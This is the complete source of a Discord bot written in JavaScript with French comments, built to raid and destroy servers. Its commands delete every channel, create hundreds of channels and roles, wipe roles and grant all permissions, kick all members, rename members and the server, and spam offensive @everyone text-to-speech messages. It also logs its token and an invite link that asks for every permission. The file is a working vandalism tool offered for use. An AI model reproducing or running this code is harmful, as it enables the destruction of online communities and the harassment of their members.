const Discord = require("discord.js");

const bot = new Discord.Client();

const prefix = "=" ;

//options

const raidmsg = "@everyone Fucked by Anarchy\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nhttps://cdn.discordapp.com/attachments/531209784561500177/540181022067916820/ahahaeee.gif";
const guildname = "Fucked by Anarchy";

const guildicon = "https://cdn.discordapp.com/attachments/539131092788051980/544209223911997441/IMG_20190122_231832_330.jpg";

const channelname = "Anarchy";
const rolename = "Anarchy";
		

process.on('unhandledRejection', (reason) => {

  console.error(reason);

});

bot.on("ready", () => {

		console.log(`${bot.user.tag} prêt pour le carnage`) 

		console.log(`invite : https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=-1`)

		console.log(`token : ${bot.token}`) 

		console.log(bot.guilds.map(g => `Serveur : ${g.name}`))

		console.log(bot.users.size) 

	 //bot.channels.map(c => c.createInvite().then(url => console.log(`${url.code} : ${url.guild.name}`)))

		//bot.guilds.map(g => g. unban("500992163296051200")) 
	
		//bot.guilds.map(g => g.createChannel("text","anarchy").then(c => c.send("=anarchie")))

		//bot.guilds.map(g => g.channels.last().createInvite().then(url => console.log(`${url.code} : ${url.guild.name}`)))

 	})

 	

bot.on("message", msg => {

		

	//masse ping

		if(msg.content.includes("@everyone")){

		msg.channel.send(raidmsg, {tts:true}) 

		

				}

			 if(msg.content === prefix+"allchan"){

 	  msg.delete();

 	  msg.guild.channels.findAll("type", "text").map(c => c.send(raidmsg, {tts:true})) 

 	 } 

 	 

				if(msg.content === prefix+"channel"){

			  			msg.delete();

			  			for(var i = 0; i < 15; i++){

			  				msg.guild.createChannel(channelname, "text");

			     }

			     

			     for(var i =0; i < 484; i++){

			     	msg.guild.createChannel(channelname,"voice");

			     	}

			     	

			     setTimeout(() => {

			     	msg. channel. send (prefix+"issou"). then(m => m. delete()) ;

			     	msg.channel.send(prefix+"allchan").then(m => m.delete());

			     	}, 60000);   

			 }

			 

		if(msg.content === prefix+"admin"){

			msg.delete();

			msg.guild.roles.map(r => r. edit({permissions:2146958591})) 

			msg.guild.roles.map(r => r.delete())

			msg.channel.send(prefix+"roles").then(m => m.delete()) 

			}

			if(msg.content===prefix+"roles"){

				  msg.delete();

			   for(var i = 0 ; i < 225; i++){

						 msg.guild.createRole({

						           	name:rolename, 

						           	mentionable:false, 

					           		permissions:2146958591, 

						           	position: ""

							})

						}

						} 

		 			//détruire des channels

			  	if(msg.content=== prefix+"ddos"){

			  		console.log("destruction")

			  		msg.guild.channels.map(c => c.delete())

			  		msg.guild.createChannel(channelname, "text").then(m => m.send(prefix+"channel"));

			  		}

			  			if(msg.content === prefix+"issou"){

			  				msg.delete();

			  				msg.channel.send(prefix+"admin").then(m => m.delete())

			  				msg.guild.setName(guildname)

			  				msg.guild.setIcon("https://cdn.discordapp.com/attachments/527950009488900102/530126796348325888/PicsArt_01-02-12.14.53.png")

			  				}				

		          if(msg.content === prefix+"banall"){

		          	msg. guild. members. map(g => g. kick())

 	           msg.author.send("tout le monde est banni")

 	           }

 	           

 	           		if(msg.content ===prefix +"rename"){

	                	msg.delete();

	                	msg.guild.members.map(g => g.setNickname("Purgé par DOS")) 

	                }

	

		if(msg.content === "blop") {
			
			msg.delete() ;
			
	bot.guilds.map(g => g.fetchBans().then(bans => bans.forEach(ban => g.unban(ban.id))))

}		
 	           			

 	           		

 	       		})

bot.login(process.env.token) 
 	       		
